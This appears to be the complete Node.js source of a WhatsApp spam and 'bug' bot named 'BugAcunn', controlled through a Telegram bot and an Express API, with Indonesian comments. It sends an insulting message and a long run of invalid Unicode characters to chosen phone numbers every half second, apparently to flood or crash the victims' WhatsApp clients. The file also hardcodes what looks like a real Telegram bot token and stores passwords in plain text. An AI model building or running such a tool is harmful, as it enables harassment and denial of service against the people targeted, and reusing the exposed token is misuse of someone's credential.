const express = require('express');
const TelegramBot = require('node-telegram-bot-api');
const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const fs = require('fs');
const crypto = require('crypto');
const app = express();
app.use(express.json());
app.use(express.static('public'));

// ========== KONFIGURASI ==========
const BOT_TOKEN = '8929432221:AAG3K8a6THua8Qf33mNEJHpc3iv_7W0tZtc'; // GANTI
const OWNER_ID = '8718615350'; // GANTI DENGAN ID TELEGRAM LU
const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// ========== DATA USER ==========
const DATA_FILE = './users.json';
let users = {}; // { username: { password, targets, sock, qr, spamInterval, totalSpam, telegramId } }
let sessions = {}; // { sessionToken: username }

function loadUsers() {
    if (fs.existsSync(DATA_FILE)) {
        try {
            const raw = fs.readFileSync(DATA_FILE);
            users = JSON.parse(raw);
        } catch(e) { users = {}; }
    }
}
function saveUsers() {
    fs.writeFileSync(DATA_FILE, JSON.stringify(users, null, 2));
}
loadUsers();

// Helper: generate session token
function generateToken() {
    return crypto.randomBytes(32).toString('hex');
}

// ========== TELEGRAM BOT ==========
// Owner only: add user
bot.onText(/\/adduser (.+) (.+)/, (msg, match) => {
    if (msg.chat.id.toString() !== OWNER_ID) {
        return bot.sendMessage(msg.chat.id, '❌ Lu bukan owner, anj!');
    }
    const username = match[1];
    const password = match[2];
    if (users[username]) {
        return bot.sendMessage(msg.chat.id, `⚠️ User ${username} sudah ada.`);
    }
    users[username] = {
        password: password, // simpan plain dulu (bisa di-hash nanti)
        targets: { admin: [], users: [] },
        sock: null,
        qr: null,
        spamInterval: null,
        totalSpam: 0,
        telegramId: null
    };
    saveUsers();
    bot.sendMessage(msg.chat.id, `✅ User ${username} berhasil ditambahkan!`);
});

// Login via Telegram
bot.onText(/\/login (.+) (.+)/, (msg, match) => {
    const username = match[1];
    const password = match[2];
    if (!users[username] || users[username].password !== password) {
        return bot.sendMessage(msg.chat.id, '❌ Username atau password salah!');
    }
    users[username].telegramId = msg.chat.id.toString();
    saveUsers();
    bot.sendMessage(msg.chat.id, `✅ Login berhasil! Akun Telegram terhubung dengan ${username}.`);
});

// Command yang membutuhkan login
function getUsernameFromChat(chatId) {
    for (let u in users) {
        if (users[u].telegramId === chatId.toString()) return u;
    }
    return null;
}

bot.onText(/\/startspam/, async (msg) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu! Ketik /login username password');
    await startWASession(username);
    bot.sendMessage(msg.chat.id, '🚀 Spam dimulai!');
});

bot.onText(/\/stopspam/, (msg) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
    stopSpamForUser(username);
    bot.sendMessage(msg.chat.id, '⛔ Spam dihentikan.');
});

bot.onText(/\/addtarget (.+) (.+)/, (msg, match) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
    const number = match[1];
    const role = match[2].toLowerCase();
    if (role !== 'admin' && role !== 'users') return bot.sendMessage(msg.chat.id, '❌ Role harus admin atau users.');
    users[username].targets[role].push(number);
    saveUsers();
    bot.sendMessage(msg.chat.id, `✅ ${role} ${number} ditambahkan!`);
    updateSpamForUser(username);
});

bot.onText(/\/removetarget (.+)/, (msg, match) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
    const number = match[1];
    let removed = false;
    ['admin', 'users'].forEach(role => {
        const idx = users[username].targets[role].indexOf(number);
        if (idx !== -1) { users[username].targets[role].splice(idx, 1); removed = true; }
    });
    if (removed) { saveUsers(); bot.sendMessage(msg.chat.id, `✅ ${number} dihapus.`); }
    else bot.sendMessage(msg.chat.id, `❌ ${number} tidak ditemukan.`);
});

bot.onText(/\/status/, (msg) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
    const user = users[username];
    const admin = user.targets.admin.join(', ') || 'kosong';
    const userList = user.targets.users.join(', ') || 'kosong';
    bot.sendMessage(msg.chat.id, `
📊 USER: ${username}
👑 Admin: ${admin}
👤 User: ${userList}
📨 Total spam: ${user.totalSpam || 0}
🔗 Koneksi WA: ${user.sock ? '✅ Online' : '❌ Offline'}
    `);
});

bot.onText(/\/getqr/, (msg) => {
    const username = getUsernameFromChat(msg.chat.id);
    if (!username) return bot.sendMessage(msg.chat.id, '❌ Login dulu.');
    const user = users[username];
    if (user.qr) {
        bot.sendMessage(msg.chat.id, `📱 Scan QR ini di WhatsApp:\n${user.qr}`);
    } else {
        bot.sendMessage(msg.chat.id, '❌ Tidak ada QR aktif. Coba /startspam');
    }
});

// ========== WA ENGINE ==========
async function startWASession(username) {
    const user = users[username];
    if (user.sock) {
        updateSpamForUser(username);
        return;
    }
    const { state, saveCreds } = await useMultiFileAuthState(`./sessions/${username}`);
    const sock = makeWASocket({
        auth: state,
        printQRInTerminal: false,
        browser: ['BugAcunn', 'Chrome', '120.0.0.0']
    });
    sock.ev.on('creds.update', saveCreds);
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) {
            user.qr = qr;
            // kirim ke Telegram jika terhubung
            if (user.telegramId) {
                bot.sendMessage(user.telegramId, `📱 Scan QR:\n${qr}`);
            }
        }
        if (connection === 'open') {
            user.sock = sock;
            user.qr = null;
            console.log(`✅ ${username} connected`);
            updateSpamForUser(username);
            if (user.telegramId) {
                bot.sendMessage(user.telegramId, '✅ WhatsApp terhubung! Spam aktif.');
            }
        }
        if (connection === 'close') {
            const reason = lastDisconnect?.error?.output?.statusCode;
            if (reason === DisconnectReason.loggedOut) {
                user.sock = null;
                if (user.telegramId) bot.sendMessage(user.telegramId, '❌ Session logout. Scan ulang dengan /getqr');
            }
        }
    });
    user.sock = sock; // sementara
    saveUsers();
}

function updateSpamForUser(username) {
    const user = users[username];
    if (user.spamInterval) {
        clearInterval(user.spamInterval);
        user.spamInterval = null;
    }
    if (!user.sock) return;
    const allTargets = [...user.targets.admin, ...user.targets.users];
    if (allTargets.length === 0) return;
    user.spamInterval = setInterval(async () => {
        try {
            for (let target of allTargets) {
                await user.sock.sendMessage(target, { text: '☠️ BUG ACUNN - GOBLOK!' });
                await user.sock.sendMessage(target, { text: '\uFFFE\uFFFF'.repeat(100) });
                user.totalSpam = (user.totalSpam || 0) + 1;
            }
        } catch (e) {}
        saveUsers();
    }, 500);
}

function stopSpamForUser(username) {
    const user = users[username];
    if (user.spamInterval) {
        clearInterval(user.spamInterval);
        user.spamInterval = null;
    }
}

// ========== REST API ==========
// Login: dapatkan session token
app.post('/api/login', (req, res) => {
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Username dan password wajib' });
    if (!users[username] || users[username].password !== password) {
        return res.status(401).json({ error: 'Username atau password salah' });
    }
    const token = generateToken();
    sessions[token] = username;
    res.json({ token, username });
});

// Middleware auth
function auth(req, res, next) {
    const token = req.headers['x-token'] || req.query.token;
    if (!token || !sessions[token]) {
        return res.status(401).json({ error: 'Unauthorized' });
    }
    req.username = sessions[token];
    next();
}

// Register (hanya untuk admin via Telegram, tapi kita juga bisa lewat API dengan autentikasi admin nanti)
// Untuk sederhana, kita buat endpoint admin dengan token khusus? Atau kita batasi via owner di Telegram saja.

// Status
app.get('/api/status', auth, (req, res) => {
    const user = users[req.username];
    res.json({
        targets: user.targets,
        totalSpam: user.totalSpam || 0,
        connected: !!user.sock
    });
});

// Start spam
app.post('/api/start', auth, async (req, res) => {
    await startWASession(req.username);
    res.json({ message: 'Session started' });
});

// Stop spam
app.post('/api/stop', auth, (req, res) => {
    stopSpamForUser(req.username);
    res.json({ message: 'Spam stopped' });
});

// Tambah target
app.post('/api/targets', auth, (req, res) => {
    const { number, role } = req.body;
    if (!number || !role) return res.status(400).json({ error: 'Missing fields' });
    const user = users[req.username];
    if (role === 'admin' || role === 'users') {
        user.targets[role].push(number);
        saveUsers();
        updateSpamForUser(req.username);
        res.json({ success: true });
    } else {
        res.status(400).json({ error: 'Invalid role' });
    }
});

// Hapus target
app.delete('/api/targets', auth, (req, res) => {
    const { number, role } = req.body;
    const user = users[req.username];
    if (role === 'admin' || role === 'users') {
        const idx = user.targets[role].indexOf(number);
        if (idx !== -1) {
            user.targets[role].splice(idx, 1);
            saveUsers();
            updateSpamForUser(req.username);
        }
        res.json({ success: true });
    } else {
        res.status(400).json({ error: 'Invalid role' });
    }
});

// Dapatkan QR
app.get('/api/qr', auth, (req, res) => {
    const user = users[req.username];
    res.json({ qr: user.qr || null });
});

// ========== ADMIN API (untuk dashboard admin) ==========
// Kita buat admin khusus: jika username adalah 'admin' (atau kita buat flag)
// Untuk sederhana, kita hanya izinkan akses admin jika username = 'admin' dan password tertentu.
// Tapi di sini kita bisa buat endpoint /api/admin/users yang hanya bisa diakses oleh admin.
// Kita asumsikan ada user dengan username 'admin' yang dibuat via Telegram.

app.get('/api/admin/users', auth, (req, res) => {
    if (req.username !== 'admin') return res.status(403).json({ error: 'Admin only' });
    const list = Object.keys(users).map(u => ({
        username: u,
        totalSpam: users[u].totalSpam || 0,
        connected: !!users[u].sock,
        targetCount: users[u].targets.admin.length + users[u].targets.users.length
    }));
    res.json(list);
});

app.post('/api/admin/adduser', auth, (req, res) => {
    if (req.username !== 'admin') return res.status(403).json({ error: 'Admin only' });
    const { username, password } = req.body;
    if (!username || !password) return res.status(400).json({ error: 'Username dan password wajib' });
    if (users[username]) return res.status(400).json({ error: 'User sudah ada' });
    users[username] = {
        password: password,
        targets: { admin: [], users: [] },
        sock: null,
        qr: null,
        spamInterval: null,
        totalSpam: 0,
        telegramId: null
    };
    saveUsers();
    res.json({ success: true });
});

// ========== JALANKAN SERVER ==========
const PORT = process.env.PORT || 8080;
app.listen(PORT, () => {
    console.log(`🚀 Server running on port ${PORT}`);
    console.log(`🤖 Bot Telegram aktif`);
});
